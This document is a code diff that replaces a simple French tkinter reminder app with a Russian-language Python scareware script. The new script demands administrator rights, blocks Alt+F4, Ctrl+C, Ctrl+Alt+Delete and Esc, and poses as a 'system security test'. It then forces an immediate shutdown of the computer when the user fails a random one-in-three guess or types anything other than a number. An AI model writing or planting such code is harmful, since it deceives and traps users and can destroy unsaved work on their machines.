@@ -1,40 +1,63 @@
+import os
+import random
+import sys
+import ctypes
+import time
+import keyboard
+import colorama
+from colorama import Fore, init
 
-import tkinter as tk
-from tkinter import messagebox
-import datetime
+# Инициализация цветного текста
+init()
+RED = Fore.RED
+RESET = Fore.RESET
 
-tasks = []
+# Проверка прав администратора (обязательно)
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
-def add_task():
-    task = entry.get()
-    if task:
-        tasks.append(task)
-        listbox.insert(tk.END, task)
-        entry.delete(0, tk.END)
+if not is_admin():
+    print(f"{RED}ОШИБКА: Запустите программу от имени администратора!{RESET}")
+    time.sleep(3)
+    sys.exit()
+
+# Блокировка клавиш (Alt+F4, Ctrl+C и т.д.)
+def block_keys():
+    keyboard.block_key("alt+f4")
+    keyboard.block_key("ctrl+c")
+    keyboard.block_key("ctrl+break")
+    keyboard.block_key("ctrl+alt+delete")
+    keyboard.block_key("esc")
+
+# Установка заголовка CMD (чтобы нельзя было закрыть через диспетчер задач)
+ctypes.windll.kernel32.SetConsoleTitleW("Системная проверка | Не закрывать!")
+
+# Основная логика
+def main():
+    block_keys()
+    safe_number = random.randint(1, 3)
+    
+    print(f"{RED}ВНИМАНИЕ: Это тест системы безопасности.{RESET}")
+    print(f"{RED}Закройте это окно — компьютер выключится!{RESET}\n")
+    print(f"{RED}Введите цифру от 1 до 3 (безопасный код сгенерирован)...{RESET}")
+    
+    try:
+        user_input = int(input(">>> "))
+    except:
+        print(f"{RED}Ошибка: введите число!{RESET}")
+        os.system("shutdown /s /t 0")
+        return
+    
+    if user_input == safe_number:
+        print(f"{RED}Правильно! Система разблокирована.{RESET}")
+        time.sleep(3)
+        sys.exit()
     else:
-        messagebox.showwarning("Champ vide", "Veuillez entrer une tâche.")
+        print(f"{RED}ОШИБКА! Неверный код. Выключение...{RESET}")
+        os.system("shutdown /s /t 0")
 
-def delete_task():
-    selected = listbox.curselection()
-    if selected:
-        listbox.delete(selected[0])
-        del tasks[selected[0]]
-
-app = tk.Tk()
-app.title("Rappels PC+")
-app.geometry("400x400")
-app.configure(bg="#f7f7f5")
-
-entry = tk.Entry(app, width=30)
-entry.pack(pady=10)
-
-add_btn = tk.Button(app, text="Ajouter un rappel", command=add_task)
-add_btn.pack()
-
-listbox = tk.Listbox(app, width=50, height=10)
-listbox.pack(pady=10)
-
-del_btn = tk.Button(app, text="Supprimer", command=delete_task)
-del_btn.pack()
-
-app.mainloop()
+if __name__ == "__main__":
+    main()
